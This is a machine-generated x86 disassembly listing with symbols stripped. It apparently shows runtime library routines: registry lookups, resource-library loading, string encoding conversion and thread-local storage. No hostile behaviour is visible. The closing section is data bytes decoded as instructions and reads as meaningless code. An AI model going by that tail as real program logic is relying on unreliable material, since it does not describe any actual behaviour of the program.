call sub_405640
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_404fb8
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404c70
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404010
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_4046d8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404b3c
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404c70
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404b54
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405640
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_404fb8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_402818
sub_404d90
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404de4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_404ddc
jmp r-xdata
mov al 0x4
call sub_402818
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_402818
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4026fc
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_4026bc
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402c88
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404a44
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4028b8
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402c88
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_404dc4
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_404de4
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_404f7c
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_4026dc
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404a44
sub_404fb8
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_404f7c
pop edx
pop eax
sub_404fe0
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_4012cc
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405010
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40125c
mov eax esp
mov dl 0x1
call sub_40524c
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405058
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405010
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405094
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401264
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40126c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405080
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405080
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405080
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_40524c
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40125c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405351
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405094
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_4012b4
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012ac
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_4012bc
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_4012b4
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40127c
push eax
call sub_401254
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_4054ec
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_4026dc
jmp r-xdata
sub_40554c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405587
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_4055b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40561c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40554c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405623
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405640
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_40566c
test edx edx
je sub_405628
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_402818
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_405710
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405738
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405814
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_40594c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4059eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_403fbc
mov eax ebx
xor edx edx
call sub_404814
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4059f2
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
mov eax ebx
call sub_404808
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404608
mov eax ebx
call sub_404808
push eax
mov eax [ ebp - 0x4 ]
call sub_40427c
inc eax
push eax
mov eax ebx
call sub_4047f8
push eax
mov eax [ ebp - 0x4 ]
call sub_40447c
pop ecx
pop edx
call sub_405738
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_403fbc
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404608
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404010
sub_4059f8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405a8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40469c
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405a96
lea eax [ ebp - 0x4 ]
call sub_40469c
retn
mov eax ebx
call sub_40427c
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_4048e4
mov eax ebx
call sub_40427c
push eax
mov eax [ ebp - 0x4 ]
call sub_404808
inc eax
push eax
mov eax ebx
call sub_40447c
push eax
mov eax [ ebp - 0x4 ]
call sub_4047f8
pop ecx
pop edx
call sub_405814
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_40469c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_4048e4
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4046d8
sub_405a9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405adf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_4047e8
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_40594c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405ae6
lea eax [ ebp - 0x4 ]
call sub_40469c
retn
sub_405aec
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_4041b4
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405058
push eax
call sub_40128c
mov ecx eax
mov edx esp
mov eax esi
call sub_4040ac
jmp r-xdata
sub_405b44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405baa
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401254
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_40422c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402ca8
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405bb1
lea eax [ ebp - 0x10 ]
call sub_403fbc
retn
xor ebx ebx
sub_405bb8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405c02
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405c09
retn
mov eax rw-data
call sub_402ae4
mov eax rw-data
call sub_402ae4
mov eax rw-data
call sub_402ae4
call sub_401ac0
sub_405c0c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] 0x2
mov [ rw-data ] sub_404d88
call sub_4030b4
test al al
je r-xdata
call sub_4031a8
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call GetCommandLineA
mov [ rw-data ] eax
call sub_40130c
mov [ rw-data ] eax
call sub_401304
and eax 0x80000000
cmp eax 0x80000000
je r-xdata
call sub_4030e4
call sub_40127c
call sub_405b44
mov [ rw-data ] eax
call sub_401304
and eax 0xff
cmp ax 0x4
jbe r-xdata
call sub_40127c
call sub_405b44
mov [ rw-data ] eax
jmp r-xdata
mov [ rw-data ] 0x3
jmp r-xdata
call sub_4012fc
mov [ rw-data ] eax
sub_405d14
push ebx
call sub_405d0c
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_405d00
test eax eax
jne r-xdata
mov eax 0xe2
call sub_403fb0
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_403fb0
sub_405d58
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_405d14
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_405da4
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_405ce0
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_405d98
mov edx rw-data
mov eax ebx
call sub_403d04
pop ebx
retn
sub_405de8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405e0d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e14
retn
sub_405e44
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_405e60
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_405e85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405e8c
retn
sub_405e98
pushfd
pop esi
inc eax
add [ ebx ] al
add ch [ esi ]
xor [ 0x0 ] eax
or al 0x0
add [ eax ] al
cwde
pop esi
inc eax
add [ edx ] cl
outsd
push ebx
insb
arpl [ gs : ebp + 0x64 ] si
or [ edi + 0x64 ] ch
inc edi
jb r-xdata
jb r-xdata
jns r-xdata
add eax [ edi ]
mov eax eax
xor [ fs : ebx ] ecx
outsd
push edx
jae r-xdata
or ch [ fs : edi + 0x64 ]
inc esp
imul esi [ ebx + 0x61 ] 0x64656c62
or [ edi + 0x64 ] ebp
inc ebx
push 0x656b6365
or [ fs : edi + 0x64 ] ebp
inc esi
outsd
arpl [ ebp + 0x73 ] si
or [ fs : edi + 0x64 ] ebp
inc esp
popa
jne r-xdata
inc edi
add [ ebx + 0x425ffc0 ] cl
jb r-xdata
jb r-xdata
je r-xdata
sar bh 0x25
cld
add al [ edi ]
mov eax eax
jmp [ __import_lookup_table_6(kernel32:EnterCriticalSection) ]
xor cl [ fs : esi ]
outsd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
inc edi
add [ ebx - 0xfda0040 ] cl
add al [ edi ]
ja EnterCriticalSection
or ch [ edi + 0x64 ]
outsd
dec eax
outsd
je r-xdata
add [ ebx + 0xc25ffc0 ] cl
add eax [ edi ]
mov eax eax
jmp [ __import_lookup_table_6(kernel32:CreateEventA) ]
imul esi [ fs : edi + eax + 0x57 ] 0x6f646e69
je FindResourceA
ja r-xdata
imul esi [ edi + eax + 0x57 ] 0x6f646e69
dec ecx
outsb
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
or [ gs : edi + 0x64 ] ebp
dec esi
outsd
inc ecx
arpl [ ebx + 0x65 ] sp
insb
or eax 0x6f4e646f
inc esi
outsd
arpl [ ebp + 0x73 ] si
push edx
arpl [ gs : ebx + ecx + 0x6f ] si
push edx
jae CompareStringA
